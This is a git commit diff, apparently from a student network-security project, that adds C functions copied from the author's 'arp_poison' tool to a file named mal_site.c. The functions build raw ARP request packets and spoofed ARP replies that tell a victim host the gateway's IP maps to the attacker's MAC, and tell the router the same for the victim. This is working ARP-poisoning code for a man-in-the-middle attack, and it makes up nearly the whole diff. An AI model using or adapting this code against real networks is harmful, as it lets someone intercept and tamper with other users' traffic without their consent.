82778790ecdcc93de1d148cc383e8c31ac9de1c2
zxchs00 <zxchs00@gmail.com>
2016-08-30 19:48:52 +0900

    copied functions from my arp_poison

--- mal_site.c
+++ mal_site.c
@@ -98,6 +98,89 @@ int gateway_IP(unsigned char* gip) {
 	return success;	// success 1 , fail 0
 }
 
+
+// copied from my arp_poison
+int make_request(u_char* pdata, u_char* tip) {
+	int i;
+	for (i = 0; i<6; i++)
+		pdata[i] = 0xFF;
+	if (eth0_MAC(&pdata[6]) == 0) {
+		printf("Error : Writing my MAC! \n");
+		return 0;
+	}
+	pdata[12] = 0x08;
+	pdata[13] = 0x06;
+	pdata[14] = 0x00;
+	pdata[15] = 0x01;
+	pdata[16] = 0x08;
+	pdata[17] = 0x00;
+	pdata[18] = 0x06;
+	pdata[19] = 0x04;
+	pdata[20] = 0x00;
+	pdata[21] = 0x01; // request
+
+	if (my_MACnIP(&pdata[22],&pdata[28]) == 0) {
+		printf("Error : Writing my IP and MAC! \n");
+		return 0;
+	}
+	for (i = 0; i<6; i++)
+		pdata[32 + i] = 0x00;
+	for (i = 0; i<4; i++)
+		pdata[38 + i] = tip[i];
+
+	return 1;
+
+}
+
+// copied from my arp_poison
+int make_sp_target(u_char* arp_data, u_char* targetip, u_char* req_data) {
+	int i;
+
+	// source MAC (6-11)
+	if (eth0_MAC(&arp_data[6]) == 0) {
+		printf("Error : Writing my MAC address at packet ! \n");
+	}
+	// sender MAC (22-27)
+	if (eth0_MAC(&arp_data[22]) == 0) {
+		printf("Error : Writing my MAC address at packet ! \n");
+	}
+	// sender IP (28-31)  --  fake to victim
+	if (gatewayIP(&arp_data[28]) == 0) {
+		printf("Error : Can't read gateway address! \n");
+	}
+	// target ip (38-41)
+	for (i = 0; i<4; i++) {
+		arp_data[38 + i] = targetip[i];
+	}
+
+	// generating ARP request for ask victim's MAC
+	if (make_request(req_data, targetip) == 0) {
+		printf("Error : Making Request \n");
+	}
+	return 1;
+}
+
+// copied from my arp_poison
+int make_sp_router(u_char* arp_data, u_char* targetip, u_char* req_data) {
+	int i;
+
+	// target ip (38-41)
+	if (gatewayIP(&arp_data[38]) == 0) {
+		printf("Error : Can't read gateway address! \n");
+	}
+	// sender IP (28-31)  --  fake to router
+	for (i = 0; i<4; i++) {
+		arp_data[28 + i] = targetip[i];
+	}
+	// generating ARP request for ask router's MAC
+	if (make_request(req_data, &arp_data[38]) == 0) {
+		printf("Error : Making Request \n");
+	}
+
+	return 1;
+}
+
+
 int main(int argc, char* argv[]) {
 	FILE* fp;
 	char* block[100][100];
